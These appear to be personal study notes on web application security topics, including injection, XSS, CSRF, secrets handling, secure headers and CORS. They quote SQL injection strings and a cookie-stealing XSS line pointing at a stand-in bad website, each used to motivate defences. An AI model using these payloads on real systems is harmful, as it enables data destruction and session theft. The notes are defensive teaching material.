# Security

## Important Topics

- injections
- 3rd party libraries
- logging
- HTTPS everywhere
- XSS & CSRF
- code secrets
- secure headers
- access control
- data management
- don't trust anyone
- authentication

## Injections

- injecting code elsewhere
  - most famous -> SQL injections
  - `''; DROP TABLE table_name; --`
  - `''; or 1=1--` -> for passwords
- images are injected into DOM after rendering
- `textnode` can help to textify and sanitise input

### How to avoid

- sanitise input (check inputs for expected inputs)
  - whitelist vs. blacklist
- parametrise queries (prepared statements)
  - pre-compile SQL statements
  - object relational mappers -> provide statements for us
- ORMs (object relational mappers) like Knex.js

## 3rd party libraries

- ensure that library is trustworthy
- check popularity (forks, stars, etc.) of package
- snyk is a tool to test node moudle dependencies

## Logging

- gather all information about user actions/behaviour
- **insufficient logging** can provide gap for hacker to take actions going unseen
- 2 packages for JS:
  - morgan (HTTP logger middleware)
  - winston (log everything)

## HTTPS everywhere

- SSL / TLS certificates
- https://letsencrypt.org/

## XSS & CSRF

### XSS - Cross-Side-Scripting

- allows attacker to execute script in client's server
- `window.location = 'new_bad_website?cookie='+ document.cookie`
- prevent through input sanitisation

### Cross Side Request Forgery

- create bad URL that has malicious code in it

### How to prevent

- sanitise inputs
- no `eval()`
- no `document.write()`
- [content security policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [secure + HTTPOnly cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

## Code secrets

- environmental variables
  - `process.env.NODE_ENV` by default
  - can define `.env` file for environmental variables
    - variables start with `REACT_APP_`
- commit history
  - NEVER add config files / passwords to git repo

## Secure headers

- `npm install helmet` -> [helmet docu](https://github.com/helmetjs/helmet)
- on server side (usually for express.js)
- middleware
- [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [HTTP header fields](https://www.tutorialspoint.com/http/http_header_fields.htm)

## Access control

- having restriction on what authenticated users are allowed to do
- **principal of least privilige**
- `cors` middleware important to security (Cross Origin Ressource Sharing)
  - need to establish cors white list
  - otherwise access is unrestricted
